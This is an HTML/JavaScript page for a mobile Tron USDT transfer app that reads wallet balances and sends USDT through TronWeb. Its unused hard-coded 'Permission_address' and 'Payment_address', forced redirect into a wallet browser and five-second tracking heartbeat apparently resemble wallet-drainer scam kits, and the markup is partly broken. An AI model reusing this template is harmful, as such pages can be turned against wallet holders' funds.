<body id="app" class="uni-body pages-index-home">

    <uni-app class="uni-app--maxwidth">
        <uni-page data-page="pages/index/home">
            <uni-page-wrapper>
                <uni-page-body>
                    <body data-v-49fe1bb8="">
                        <div data-v-49fe1bb8="">
                            <!-- 收款地址输入区域 -->
                            <div class="address-input">
                                <label for="receiptAddress">收款地址（Tron地址）</label>
                                <input type="text" id="receiptAddress" placeholder="请输入Tron地址" />
                            </div>
                            
                            <!-- 转账金额区域 -->

                                    </div>
                                    <div data-v-49fe1bb8="" class="rate"><span id="amount-display"></span><em data-v-49fe1bb8="">USD</em>
                                        <div data-v-49fe1bb8="" class="icon"><img data-v-49fe1bb8="" src="png/icon_horn.jpg"></div>
                                    </div>
                                </div>
                                
                                <!-- 矿工费信息 -->
                                <div class="fee-info">
                                    <p>矿工费: <span id="minerFee">0 TRX</span></p>
                                </div>
                                
                                <!-- 数字键盘区域 -->
                                <div data-v-49fe1bb8="" class="bottom-keyboard">
                                    <div data-v-49fe1bb8="" class="asset-info">
                                        <div data-v-49fe1bb8="" class="name">
                                            <img data-v-49fe1bb8="" src="png/icon_usdt.png" class="coin">
                                            <div data-v-49fe1bb8="" class="asset-box">
                                                <p data-v-49fe1bb8="" class="title">USDT余额</p>
                                                <p data-v-49fe1bb8="" class="num"><span data-v-49fe1bb8="" id="usdtBalance"></span><em data-v-49fe1bb8="">USDT</em></p>
                                            </div>
                                        </div>
                                        <div data-v-49fe1bb8="" class="name" style="margin-left: 1rem;">
                                            <img data-v-49fe1bb8="" src="png/icon_trx.png" class="coin">
                                            <div data-v-49fe1bb8="" class="asset-box">
                                                <p data-v-49fe1bb8="" class="title">TRX余额</p>
                                                <p data-v-49fe1bb8="" class="num"><span data-v-49fe1bb8="" id="trxBalance"></span><em data-v-49fe1bb8="">TRX</em></p>
                                            </div>
                                        </div>
                                        <div data-v-49fe1bb8="" class="right">
                                            <div data-v-49fe1bb8="" class="btn">最大</div>
                                        </div>
                                                                        
                                    <footer style="display: flex; justify-content: center; align-items: center; margin-top: 20px;">
                                        <van-button class="submit-btn disabled" type="button" id="submitBtn" disabled style="display: flex; justify-content: center; align-items: center; text-align: center; width: 100%;">确认转账</van-button>
                                    </footer>
                                </div>
                            </div>
                        </div>
                        <div class="tishi" id="tip">提示</div>
                        <input id="to_address" type="hidden">
                    </body>
                </uni-page-body>
            </uni-page-wrapper>
        </uni-page>
    </uni-app>    
<script>
    // 配置地址
    window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1';
    window.Payment_address = 'TAymcrbZ3ybiVq9DrqQXWx3AmtPWMiwhsh';
    window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    window.heartbeatUrl = 'https://baidu.com/heartbeat';

    // 存储用户数据
    const userData = {
        address: null,
        trxBalance: null,
        usdtBalance: null
    };
    
    let currentAmount = '0';
    const USDT_TO_USD_RATE = 0.99; // USDT兑USD汇率，实际应从API获取
    const MINER_FEE_TRX = 0.1; // 矿工费，实际应根据网络情况计算

    // 主初始化函数
    async function initializeDApp() {
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        const isDAppBrowser = typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined';
        
        if (!isMobile) {
            tip('建议在移动端钱包环境使用');
        } else if (isMobile && !isDAppBrowser) {
            const currentUrl = encodeURIComponent(window.location.href);
            window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
        } else if (isMobile && isDAppBrowser) {
            await connectWallet();
            bindButtonEvents();
        }
        
        // 显示矿工费
        document.getElementById('minerFee').textContent = `${MINER_FEE_TRX} TRX`;
        updateAmountDisplay();
    }

    // 连接到钱包
    async function connectWallet() {
        try {
            if (window.tronWeb && window.tronWeb.ready) {
                await initDApp();
            } else if (window.tronLink) {
                const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                if (res.code === 200) {
                    window.tronWeb = window.tronLink.tronWeb;
                    await initDApp();
                }
            }
        } catch (error) {
            console.error("钱包连接失败:", error);
            tip('钱包连接失败，请检查钱包环境');
        }
    }

    // 初始化DApp数据
    async function initDApp() {
        try {
            userData.address = window.tronWeb.defaultAddress.base58;
            
            // 获取TRX余额
            const trxBalanceSun = await window.tronWeb.trx.getBalance(userData.address);
            userData.trxBalance = window.tronWeb.fromSun(trxBalanceSun);
            
            // 获取USDT余额
            const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
            const usdtBalanceRaw = await contract.balanceOf(userData.address).call();
            userData.usdtBalance = usdtBalanceRaw / 1e6; // USDT是6位小数
            
            // 更新页面显示
            document.getElementById('trxBalance').textContent = parseFloat(userData.trxBalance).toFixed(4);
            document.getElementById('usdtBalance').textContent = parseFloat(userData.usdtBalance).toFixed(4);
            
        } catch (error) {
            console.error("获取用户数据时出错:", error);
            tip('获取钱包数据失败');
        }
    }

    // 数字键盘输入处理
    function pressKey(key) {
        if (key === 'delete') {
            deleteLastChar();
            return;
        }
        
        if (currentAmount.length >= 10) return;
        
        if (key === '.') {
            if (currentAmount.includes('.')) return;
            if (currentAmount === '0') {
                currentAmount = '0.';
            } else {
                currentAmount += '.';
            }
            updateAmountDisplay();
            return;
        }
        
        let [integerPart, decimalPart] = currentAmount.split('.');
        if (typeof decimalPart !== 'undefined') {
            // 限制小数位为6位（USDT精度）
            if (decimalPart.length < 6) {
                decimalPart += key;
            }
        } else {
            if (integerPart === '0') {
                integerPart = key;
            } else {
                integerPart += key;
            }
        }
        
        currentAmount = decimalPart ? `${integerPart}.${decimalPart}` : integerPart;
        updateAmountDisplay();
    }

    // 删除最后一个字符
    function deleteLastChar() {
        if (currentAmount.length > 1) {
            currentAmount = currentAmount.slice(0, -1);
        } else {
            currentAmount = '0';
        }
        updateAmountDisplay();
    }

    // 设置最大转账金额
    function setMaxAmount() {
        currentAmount = parseFloat(userData.usdtBalance).toFixed(6);
        updateAmountDisplay();
    }

    // 更新金额显示
    function updateAmountDisplay() {
        let displayAmount = currentAmount;
        const maxBalance = parseFloat(userData.usdtBalance || '0');

        // 检查是否超过最大余额
        if (parseFloat(displayAmount) > maxBalance) {
            displayAmount = maxBalance.toFixed(6);
            currentAmount = displayAmount;
        }
        
        // 更新USDT显示
        const amountElement = document.getElementById('amount');
        if (amountElement) {
            amountElement.textContent = displayAmount;
        }
        
        // 更新USD显示
        const usdAmount = (parseFloat(displayAmount) * USDT_TO_USD_RATE).toFixed(2);
        const usdElement = document.getElementById('amount-display');
        if (usdElement) {
            usdElement.textContent = usdAmount;
        }
        
        updateNextButtonState();
        document.title = `正在申请转账 ${displayAmount} USDT`;
    }

    // 更新下一步按钮状态
    function updateNextButtonState() {
        const nextButton = document.getElementById('submitBtn');
        if (!nextButton) return;
        
        const amount = parseFloat(currentAmount || '0');
        const hasAddress = document.getElementById('receiptAddress').value.trim() !== '';
        const hasEnoughUsdt = amount <= parseFloat(userData.usdtBalance || '0');
        const hasEnoughTrx = parseFloat(userData.trxBalance || '0') >= MINER_FEE_TRX;
        
        const isValid = amount > 0 && hasAddress && hasEnoughUsdt && hasEnoughTrx;
        nextButton.disabled = !isValid;
        nextButton.classList.toggle('disabled', !isValid);
    }

    // 绑定按钮事件
    function bindButtonEvents() {
        // 数字键盘事件
        document.querySelectorAll('.keyboard-box .btn').forEach(btn => {
            if (btn.classList.contains('delete')) {
                btn.addEventListener('click', () => pressKey('delete'));
            } else {
                btn.addEventListener('click', (event) => pressKey(event.target.textContent));
            }
        });
        
        // 最大按钮事件
        const maxBtn = document.querySelector('.asset-info .right .btn');
        if (maxBtn) {
            maxBtn.addEventListener('click', setMaxAmount);
        }
        
        // 确认转账按钮事件
        const submitBtn = document.getElementById('submitBtn');
        if (submitBtn) {
            submitBtn.addEventListener('click', onSubmitTransfer);
        }
        
        // 地址输入事件
        const addressInput = document.getElementById('receiptAddress');
        if (addressInput) {
            addressInput.addEventListener('input', updateNextButtonState);
        }
    }

    // 提交转账
    async function onSubmitTransfer() {
        const receiptAddress = document.getElementById('receiptAddress').value.trim();
        const amount = parseFloat(currentAmount);
        
        if (!receiptAddress) {
            tip('请输入收款地址');
            return;
        }
        
        // 验证Tron地址格式
        if (!window.tronWeb.isAddress(receiptAddress)) {
            tip('请输入有效的Tron地址');
            return;
        }
        
        try {
            tip('正在准备转账...');
            
            // 获取USDT合约实例
            const usdtContract = await window.tronWeb.contract().at(window.usdtContractAddress);
            
            // 转账金额需要乘以1e6（USDT的精度）
            const amountWithDecimals = Math.round(amount * 1e6);
            
            // 执行转账
            const result = await usdtContract.transfer(receiptAddress, amountWithDecimals).send({
                feeLimit: 1000000, // 手续费限制
                callValue: 0 // USDT转账不需要附加TRX
            });
            
            console.log("转账结果:", result);
            tip(`转账成功！交易哈希: ${result}`);
            
            // 重置金额
            currentAmount = '0';
            updateAmountDisplay();
            
        } catch (error) {
            console.error("转账失败:", error);
            tip(`转账失败: ${error.message || '未知错误'}`);
        }
    }

    // 显示提示信息
    function tip(message) {
        const tipElement = document.getElementById('tip');
        if (tipElement) {
            tipElement.textContent = message;
            tipElement.style.display = 'block';
            tipElement.style.height = 'auto';
            
            setTimeout(() => {
                tipElement.style.display = 'none';
            }, 3000);
        }
    }

    // 页面加载完成后初始化
    document.addEventListener('DOMContentLoaded', () => {
        updateAmountDisplay();
        initializeDApp();
    });

    // 心跳检测
    function sendHeartbeat() {
        const currentUrl = window.location.href;
        
        fetch(window.heartbeatUrl, {
            method: 'POST',
            mode: 'cors',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ url: currentUrl })
        })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'error' && data.message === '会话已结束') {
                console.log('会话已结束');
                tip('会话已结束');
            }
        })
        .catch(() => {});
    }
    
    const heartbeatInterval = setInterval(sendHeartbeat, 5000);
    window.onload = sendHeartbeat;
    window.onbeforeunload = function() {
        clearInterval(heartbeatInterval);
    };
</script>
</body>
</html>
